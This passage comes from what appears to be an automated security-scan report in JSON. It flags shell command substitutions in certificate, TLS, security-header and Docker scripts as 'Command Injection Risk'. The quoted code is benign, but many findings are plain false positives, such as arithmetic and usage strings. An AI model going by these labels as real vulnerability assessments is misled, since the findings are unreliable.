        "evidence": "host=$(echo \"$result\" | grep -o '\"host\":\"[^\"]*\"' | cut -d'\"' -f4)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 492,
        "issue": "Command substitution in shell",
        "evidence": "port=$(echo \"$result\" | grep -o '\"port\":[0-9]*' | grep -o '[0-9]*')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 493,
        "issue": "Command substitution in shell",
        "evidence": "days=$(echo \"$result\" | grep -o '\"days_remaining\":[0-9-]*' | grep -o '[0-9-]*$')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 494,
        "issue": "Command substitution in shell",
        "evidence": "status=$(echo \"$result\" | grep -o '\"status\":\"[^\"]*\"' | cut -d'\"' -f4)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 510,
        "issue": "Command substitution in shell",
        "evidence": "printf \"Timestamp: %s\\n\" \"$(date -u +\"%Y-%m-%d %H:%M:%S UTC\")\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 515,
        "issue": "Command substitution in shell",
        "evidence": "printf \"%-40s %-10s %-15s %-25s\\n\" \"$(printf '%0.s-' {1..40})\" \"$(printf '%0.s-' {1..10})\" \"$(printf '%0.s-' {1..15})\" \"$(printf '%0.s-' {1..25})\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/signing-verification/resources/examples/sigstore-cosign-container.sh",
        "line_number": 147,
        "issue": "Command substitution in shell",
        "evidence": "$(sed 's/^/            /' cosign.pub)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/signing-verification/resources/examples/sigstore-cosign-container.sh",
        "line_number": 178,
        "issue": "Command substitution in shell",
        "evidence": "-a \"timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)\" \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
        "line_number": 8,
        "issue": "Command substitution in shell",
        "evidence": "SCRIPT_NAME=$(basename \"$0\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
        "line_number": 105,
        "issue": "Command substitution in shell",
        "evidence": "content=$(cat \"$file\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
        "line_number": 192,
        "issue": "Command substitution in shell",
        "evidence": "max_age=$(echo \"$content\" | grep -o \"max-age=[0-9]*\" | head -1 | cut -d= -f2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
        "line_number": 233,
        "issue": "Command substitution in shell",
        "evidence": "content=$(cat \"$file\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
        "line_number": 323,
        "issue": "Command substitution in shell",
        "evidence": "\"timestamp\": \"$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")\",",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
        "line_number": 328,
        "issue": "Command substitution in shell",
        "evidence": "\"total\": $((PASSED + WARNINGS + ERRORS))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
        "line_number": 330,
        "issue": "Command substitution in shell",
        "evidence": "\"status\": \"$(if [[ $ERRORS -eq 0 ]]; then echo \"pass\"; else echo \"fail\"; fi)\",",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
        "line_number": 331,
        "issue": "Command substitution in shell",
        "evidence": "\"grade\": \"$(if [[ $ERRORS -eq 0 ]] && [[ $WARNINGS -eq 0 ]]; then echo \"A+\"; elif [[ $ERRORS -eq 0 ]]; then echo \"B\"; else echo \"C\"; fi)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/validate_tls_config.sh",
        "line_number": 389,
        "issue": "Command substitution in shell",
        "evidence": "SERVER_TYPE=$(detect_server_type \"$CONFIG_FILE\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/vulnerability-assessment/resources/scripts/scan_dependencies.sh",
        "line_number": 55,
        "issue": "Command substitution in shell",
        "evidence": "echo '  \"scan_date\": \"'$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")'\",' >> \"$OUTPUT_FILE\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 11,
        "issue": "Command substitution in shell",
        "evidence": "SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 30,
        "issue": "Command substitution in shell",
        "evidence": "Usage: $(basename \"$0\") [OPTIONS] <url1> [url2 ...]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 46,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") https://example.com",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 49,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") example.com example.org example.net",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 52,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") -f domains.txt",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 55,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --output json example.com > results.json",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 58,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --compare staging.example.com production.example.com",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 61,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") -j 10 -v -f domains.txt",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 125,
        "issue": "Command substitution in shell",
        "evidence": "if ! response=$(curl \"${curl_opts[@]}\" \"$url\" 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 132,
        "issue": "Command substitution in shell",
        "evidence": "http_code=$(echo \"$response\" | grep \"^HTTP_CODE:\" | cut -d: -f2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 135,
        "issue": "Command substitution in shell",
        "evidence": "redirect_url=$(echo \"$response\" | grep \"^REDIRECT_URL:\" | cut -d: -f2- || echo \"$url\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 139,
        "issue": "Command substitution in shell",
        "evidence": "strict_transport_security=$(echo \"$response\" | grep -i \"^strict-transport-security:\" | cut -d: -f2- | xargs || echo \"\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 142,
        "issue": "Command substitution in shell",
        "evidence": "content_security_policy=$(echo \"$response\" | grep -i \"^content-security-policy:\" | cut -d: -f2- | xargs || echo \"\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 145,
        "issue": "Command substitution in shell",
        "evidence": "x_frame_options=$(echo \"$response\" | grep -i \"^x-frame-options:\" | cut -d: -f2- | xargs || echo \"\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 148,
        "issue": "Command substitution in shell",
        "evidence": "x_content_type_options=$(echo \"$response\" | grep -i \"^x-content-type-options:\" | cut -d: -f2- | xargs || echo \"\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 151,
        "issue": "Command substitution in shell",
        "evidence": "referrer_policy=$(echo \"$response\" | grep -i \"^referrer-policy:\" | cut -d: -f2- | xargs || echo \"\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 154,
        "issue": "Command substitution in shell",
        "evidence": "permissions_policy=$(echo \"$response\" | grep -i \"^permissions-policy:\" | cut -d: -f2- | xargs || echo \"\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 157,
        "issue": "Command substitution in shell",
        "evidence": "feature_policy=$(echo \"$response\" | grep -i \"^feature-policy:\" | cut -d: -f2- | xargs || echo \"\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 160,
        "issue": "Command substitution in shell",
        "evidence": "x_xss_protection=$(echo \"$response\" | grep -i \"^x-xss-protection:\" | cut -d: -f2- | xargs || echo \"\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 168,
        "issue": "Command substitution in shell",
        "evidence": "score=$((score + 20))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 173,
        "issue": "Command substitution in shell",
        "evidence": "score=$((score + 30))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 178,
        "issue": "Command substitution in shell",
        "evidence": "score=$((score + 15))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 183,
        "issue": "Command substitution in shell",
        "evidence": "score=$((score + 15))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 188,
        "issue": "Command substitution in shell",
        "evidence": "score=$((score + 10))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 193,
        "issue": "Command substitution in shell",
        "evidence": "score=$((score + 10))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 222,
        "issue": "Command substitution in shell",
        "evidence": "\"strict_transport_security\": $(if [ -n \"$strict_transport_security\" ]; then echo \"\\\"$strict_transport_security\\\"\"; else echo \"null\"; fi),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 223,
        "issue": "Command substitution in shell",
        "evidence": "\"content_security_policy\": $(if [ -n \"$content_security_policy\" ]; then echo \"\\\"$content_security_policy\\\"\"; else echo \"null\"; fi),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 224,
        "issue": "Command substitution in shell",
        "evidence": "\"x_frame_options\": $(if [ -n \"$x_frame_options\" ]; then echo \"\\\"$x_frame_options\\\"\"; else echo \"null\"; fi),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 225,
        "issue": "Command substitution in shell",
        "evidence": "\"x_content_type_options\": $(if [ -n \"$x_content_type_options\" ]; then echo \"\\\"$x_content_type_options\\\"\"; else echo \"null\"; fi),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 226,
        "issue": "Command substitution in shell",
        "evidence": "\"referrer_policy\": $(if [ -n \"$referrer_policy\" ]; then echo \"\\\"$referrer_policy\\\"\"; else echo \"null\"; fi),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 227,
        "issue": "Command substitution in shell",
        "evidence": "\"permissions_policy\": $(if [ -n \"$permissions_policy\" ]; then echo \"\\\"$permissions_policy\\\"\"; else echo \"null\"; fi),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 228,
        "issue": "Command substitution in shell",
        "evidence": "\"feature_policy\": $(if [ -n \"$feature_policy\" ]; then echo \"\\\"$feature_policy\\\"\"; else echo \"null\"; fi),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 229,
        "issue": "Command substitution in shell",
        "evidence": "\"x_xss_protection\": $(if [ -n \"$x_xss_protection\" ]; then echo \"\\\"$x_xss_protection\\\"\"; else echo \"null\"; fi)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 242,
        "issue": "Command substitution in shell",
        "evidence": "echo \"\\\"$url\\\",\\\"$grade\\\",$score,$([ -n \"$strict_transport_security\" ] && echo \"Yes\" || echo \"No\"),$([ -n \"$content_security_policy\" ] && echo \"Yes\" || echo \"No\"),$([ -n \"$x_frame_options\" ] && echo \"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 255,
        "issue": "Command substitution in shell",
        "evidence": "[$([ -n \"$strict_transport_security\" ] && echo \"\u2713\" || echo \"\u2717\")] Strict-Transport-Security",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 258,
        "issue": "Command substitution in shell",
        "evidence": "[$([ -n \"$content_security_policy\" ] && echo \"\u2713\" || echo \"\u2717\")] Content-Security-Policy",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 261,
        "issue": "Command substitution in shell",
        "evidence": "[$([ -n \"$x_frame_options\" ] && echo \"\u2713\" || echo \"\u2717\")] X-Frame-Options",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 264,
        "issue": "Command substitution in shell",
        "evidence": "[$([ -n \"$x_content_type_options\" ] && echo \"\u2713\" || echo \"\u2717\")] X-Content-Type-Options",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 267,
        "issue": "Command substitution in shell",
        "evidence": "[$([ -n \"$referrer_policy\" ] && echo \"\u2713\" || echo \"\u2717\")] Referrer-Policy",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 270,
        "issue": "Command substitution in shell",
        "evidence": "[$([ -n \"$permissions_policy\" ] && echo \"\u2713\" || echo \"\u2717\")] Permissions-Policy",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 273,
        "issue": "Command substitution in shell",
        "evidence": "[$([ -n \"$feature_policy\" ] && echo \"\u2713\" || echo \"\u2717\")] Feature-Policy (deprecated)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 276,
        "issue": "Command substitution in shell",
        "evidence": "[$([ -n \"$x_xss_protection\" ] && echo \"\u2713\" || echo \"\u2717\")] X-XSS-Protection",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 307,
        "issue": "Command substitution in shell",
        "evidence": "echo \"$(echo \"$header\" | tr '[:lower:]' '[:upper:]' | tr '-' ' '):\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 316,
        "issue": "Command substitution in shell",
        "evidence": "response=$(curl -s -I -L --max-time \"$TIMEOUT\" \"$url\" 2>&1 || echo \"\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 319,
        "issue": "Command substitution in shell",
        "evidence": "value=$(echo \"$response\" | grep -i \"^$header:\" | cut -d: -f2- | xargs || echo \"\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 412,
        "issue": "Command substitution in shell",
        "evidence": "TEMP_DIR=$(mktemp -d)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 424,
        "issue": "Command substitution in shell",
        "evidence": "printf \"%s\\n\" \"${URLS[@]}\" | xargs -P \"$PARALLEL_JOBS\" -I {} bash -c \"test_url '{}' '$TEMP_DIR/\\$(echo {} | md5sum | cut -d' ' -f1)'\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 444,
        "issue": "Command substitution in shell",
        "evidence": "first_file=$(find \"$TEMP_DIR\" -type f | head -n1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 50,
        "issue": "Command substitution in shell",
        "evidence": "Usage: $(basename \"$0\") [OPTIONS] IMAGE_NAME",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 63,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") myapp:latest",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 66,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") -b myapp:latest",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 69,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --json myapp:latest",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 150,
        "issue": "Command substitution in shell",
        "evidence": "echo \"$(awk \"BEGIN {printf \\\"%.2f\\\", $bytes/1024}\")KB\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 152,
        "issue": "Command substitution in shell",
        "evidence": "echo \"$(awk \"BEGIN {printf \\\"%.2f\\\", $bytes/1048576}\")MB\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 154,
        "issue": "Command substitution in shell",
        "evidence": "echo \"$(awk \"BEGIN {printf \\\"%.2f\\\", $bytes/1073741824}\")GB\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 165,
        "issue": "Command substitution in shell",
        "evidence": "total_layers=$(docker history \"$image\" --no-trunc --format \"{{.Size}}\" | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 181,
        "issue": "Command substitution in shell",
        "evidence": "base_image=$(docker image inspect \"$image\" --format='{{.Config.Image}}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 188,
        "issue": "Command substitution in shell",
        "evidence": "user=$(docker image inspect \"$image\" --format='{{.Config.User}}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 195,
        "issue": "Command substitution in shell",
        "evidence": "healthcheck=$(docker image inspect \"$image\" --format='{{.Config.Healthcheck}}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 202,
        "issue": "Command substitution in shell",
        "evidence": "layers=$(docker history \"$image\" --quiet | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 260,
        "issue": "Command substitution in shell",
        "evidence": "content=$(cat \"$original_dockerfile\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 294,
        "issue": "Command substitution in shell",
        "evidence": "$(echo \"$issues\" | sed 's/^/    \"/; s/$/\"/' | paste -sd ',' -)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 297,
        "issue": "Command substitution in shell",
        "evidence": "$(echo \"$recommendations\" | sed 's/^/    \"/; s/$/\"/' | paste -sd ',' -)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 355,
        "issue": "Command substitution in shell",
        "evidence": "size_bytes=$(get_image_size \"$image\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 357,
        "issue": "Command substitution in shell",
        "evidence": "size_human=$(human_size \"$size_bytes\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 360,
        "issue": "Command substitution in shell",
        "evidence": "layers=$(docker history \"$image\" --quiet | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 363,
        "issue": "Command substitution in shell",
        "evidence": "issues=$(check_optimizations \"$image\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 366,
        "issue": "Command substitution in shell",
        "evidence": "recommendations=$(generate_recommendations \"$image\" \"$size_bytes\" \"$size_human\" \"$issues\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 397,
        "issue": "Command substitution in shell",
        "evidence": "original_size=$(get_image_size \"$image\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 399,
        "issue": "Command substitution in shell",
        "evidence": "optimized_size=$(get_image_size \"$optimized_image\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 402,
        "issue": "Command substitution in shell",
        "evidence": "reduction=$(awk \"BEGIN {printf \\\"%.1f\\\", 100 - ($optimized_size * 100.0 / $original_size)}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 406,
        "issue": "Command substitution in shell",
